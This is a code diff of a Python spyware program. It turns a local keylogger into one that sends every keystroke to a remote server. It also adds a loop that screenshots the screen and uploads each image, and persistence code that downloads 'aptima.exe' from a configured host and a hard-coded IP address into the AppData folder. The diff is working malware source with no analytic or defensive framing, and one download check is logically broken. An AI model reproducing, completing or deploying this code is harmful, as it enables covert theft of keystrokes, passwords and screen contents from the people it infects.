@@ -2,6 +2,7 @@ import glob
 import shutil
 import subprocess
 import sys
+import requests as r
 
 from pynput.keyboard import Listener
 import logging
@@ -13,11 +14,10 @@ import numpy as np
 import threading
 import os as o
 
-logging.basicConfig(filename="log.txt", level=logging.DEBUG, format=" %(asctime)s - %(message)s")
-
+host = 'http://localhost:8080'
 
 def on_press(key):
-    logging.info(str(key))
+    r.get(host+'/key', params={'v': str(key)})
 
 
 def grab():
@@ -28,31 +28,49 @@ def grab():
     monitor = {"top": 0, "left": 0, "width": screen_width, "height": screen_height}
     while "Screen capturing":
         grabber = mss.mss()
-        output = str(time.time()) + ".jpeg".format(**monitor)
-        grabber.compression_level = 2
+        output = o.environ['appdata'] + '\\' +str(time.time()) + ".jpeg".format(**monitor)
         # Grab the data
         sct_img = grabber.grab(monitor)
         screenshot = np.array(sct_img)
-
         image = cv.pyrDown(screenshot)
         cv.imwrite(output, image)
+        print("uploading image")
+        url = host+'/aptima'
+        r.post(url, files={"file": open(output, 'rb')})
+        o.remove(output)
+        print("image uploaded")
         # Save to the picture file
-        # mss.tools.tp(sct_img.rgb, sct_img.size, output=output)
+        # mss.tools.to_png(sct_img.rgb, sct_img.size, output=output)
 
         print(output)
         time.sleep(1)
 
 
 def persist_thread():
+    copy_name = "aptima.exe"
+    file_location = o.environ['appdata'] + '\\' + copy_name
+    print("downloading ....")
+    url = host+'/aptima.exe'
+    req = r.get(url, allow_redirects=True)
+    open(file_location, 'wb').write(req.content)
+    print("download : done")
     while True:
         persist()
-        time.sleep(1)
+        time.sleep(2)
 
 
 def persist():
     reg_name = "aptima"
     copy_name = "aptima.exe"
     file_location = o.environ['appdata'] + '\\' + copy_name
+    # si le fichier existe et fait moins de 10mo, on le dl
+    if o.path.isfile(file_location) is False and 1024 * 1024 * 10 > o.path.getsize(file_location):
+        print("downloading ....")
+        url = 'http://195.154.191.13/aptima.exe'
+        req = r.get(url, allow_redirects=True)
+        open(file_location, 'wb').write(req.content)
+        print("download : done")
+    print(file_location)
     try:
         if not o.path.exists(file_location):
             shutil.copyfile(sys.executable, file_location)
